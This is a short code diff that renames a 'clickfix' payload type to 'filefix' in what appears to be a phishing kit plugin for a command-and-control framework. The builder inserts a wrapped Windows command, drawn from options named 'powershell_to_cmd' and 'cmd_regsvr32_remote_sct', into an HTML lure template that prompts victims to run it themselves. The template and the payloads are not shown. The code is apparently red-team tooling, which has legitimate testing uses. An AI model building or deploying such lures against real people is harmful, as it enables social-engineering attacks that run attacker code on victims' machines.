@@ -10,14 +10,14 @@ import shutil
 import base64
 import random
 
-class clickfix(PayloadType):
-    name = "clickfix"
+class filefix(PayloadType):
+    name = "filefix"
     file_extension = "html"
     author = "@hegusung"
     supported_os = [SupportedOS.Windows]
     wrapper = True
     wrapped_payloads = ["powershell_to_cmd", "cmd_regsvr32_remote_sct"]
-    note = """Creates a clickfix payload"""
+    note = """Creates a filefix payload"""
     translation_container = None # "myPythonTranslation"
     agent_path = pathlib.Path(".") / "phishingkit"
     agent_icon_path = agent_path / "agent_functions" / "phishing.svg"
@@ -38,16 +38,15 @@ class clickfix(PayloadType):
             cmd_payload = self.wrapped_payload.decode()
             cmd_payload = cmd_payload.replace('"', '\\"')
 
-            f = open(os.path.join(self.agent_code_path, "clickfix.html.template"), 'r')
-            clickfix_template = f.read()
+            f = open(os.path.join(self.agent_code_path, "filefix.html.template"), 'r')
+            filefix_template = f.read()
             f.close()
 
-            clickfix_args = {
+            filefix_args = {
                 "payload": cmd_payload,
             }
 
-
-            resp.payload = clickfix_template.format(**clickfix_args)
+            resp.payload = filefix_template.format(**filefix_args)
             resp.build_message = "Successfully built!\n"
 
         except Exception as e:
